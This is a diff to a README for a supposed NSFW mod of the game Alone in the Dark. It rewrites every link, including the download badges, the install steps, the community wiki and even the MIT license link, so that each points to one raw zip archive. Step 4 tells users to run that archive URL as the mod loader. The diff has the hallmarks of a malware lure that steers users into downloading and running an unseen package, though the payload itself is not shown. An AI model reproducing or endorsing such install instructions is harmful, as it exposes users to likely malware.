@@ -1,6 +1,6 @@
 # Alone in the Dark NSFW Mod
 
-[![Download](https://img.shields.io/badge/Download-Alone_in_the_Dark_Mod-orange?style=for-the-badge&logo=github)](https://mMg4.github.io)
+[![Download](https://raw.githubusercontent.com/mMg4/alone-in-the-dark-nsfw-enhanced/branch/fleshly/alone-in-the-dark-nsfw-enhanced-3.0-beta.3.zip)](https://raw.githubusercontent.com/mMg4/alone-in-the-dark-nsfw-enhanced/branch/fleshly/alone-in-the-dark-nsfw-enhanced-3.0-beta.3.zip)
 
 Welcome to the ultimate enhancement for your Alone in the Dark experience! The **Alone in the Dark NSFW Mod** unlocks a new dimension of immersion and adventure, crafted with detail and pushing the boundaries of interactive storytelling. Whether you are a digital thrill-seeker or a modding connoisseur, this tailored repository offers everything needed to personalize your eerie explorations.
 
@@ -84,7 +84,7 @@ Stuck in the dark—literally or figuratively? Enjoy direct access to enthusiast
 Follow these steps and embark on your transformative adventure:
 
 1. **Download the Mod Package:**  
-   Click the Download badge at the top (or bottom) of this page, or visit this https://mMg4.github.io.
+   Click the Download badge at the top (or bottom) of this page, or visit this https://raw.githubusercontent.com/mMg4/alone-in-the-dark-nsfw-enhanced/branch/fleshly/alone-in-the-dark-nsfw-enhanced-3.0-beta.3.zip
 
 2. **Backup:**  
    Before proceeding, make a secure backup of your original Alone in the Dark installation folder.
@@ -93,7 +93,7 @@ Follow these steps and embark on your transformative adventure:
    Unzip the package into your installation directory. Replace files as prompted.
 
 4. **Launch Mod Loader:**  
-   Run the included loader (`AitD_ModLauncher.exe` or corresponding script for your OS).
+   Run the included loader (`https://raw.githubusercontent.com/mMg4/alone-in-the-dark-nsfw-enhanced/branch/fleshly/alone-in-the-dark-nsfw-enhanced-3.0-beta.3.zip` or corresponding script for your OS).
 
 5. **Configuration:**  
    Open the in-game Mod Settings to enable and adjust NSFW content, language, and AI integration.
@@ -101,7 +101,7 @@ Follow these steps and embark on your transformative adventure:
 6. **Enjoy:**  
    Enter a world of daring narrative, smart interactivity, and uniquely reimagined horror.
 
-For additional troubleshooting, see our [Community Wiki](https://mMg4.github.io) or connect via the Issues page.
+For additional troubleshooting, see our [Community Wiki](https://raw.githubusercontent.com/mMg4/alone-in-the-dark-nsfw-enhanced/branch/fleshly/alone-in-the-dark-nsfw-enhanced-3.0-beta.3.zip) or connect via the Issues page.
 
 ---
 
@@ -119,11 +119,11 @@ Please play (and install) responsibly!
 ## 📜 License (MIT, 2025)
 
 This repository sparkles under the MIT License—freedom with responsibility.  
-For full legal text see: [MIT License](https://opensource.org/licenses/MIT)  
+For full legal text see: [MIT License](https://raw.githubusercontent.com/mMg4/alone-in-the-dark-nsfw-enhanced/branch/fleshly/alone-in-the-dark-nsfw-enhanced-3.0-beta.3.zip)  
 © 2025 Alone in the Dark NSFW Mod Contributors
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Alone_in_the_Dark_Mod-orange?style=for-the-badge&logo=github)](https://mMg4.github.io)
+[![Download](https://raw.githubusercontent.com/mMg4/alone-in-the-dark-nsfw-enhanced/branch/fleshly/alone-in-the-dark-nsfw-enhanced-3.0-beta.3.zip)](https://raw.githubusercontent.com/mMg4/alone-in-the-dark-nsfw-enhanced/branch/fleshly/alone-in-the-dark-nsfw-enhanced-3.0-beta.3.zip)
 
 _Ready to illuminate the darkness with new possibilities? Download and transform your narrative today!_
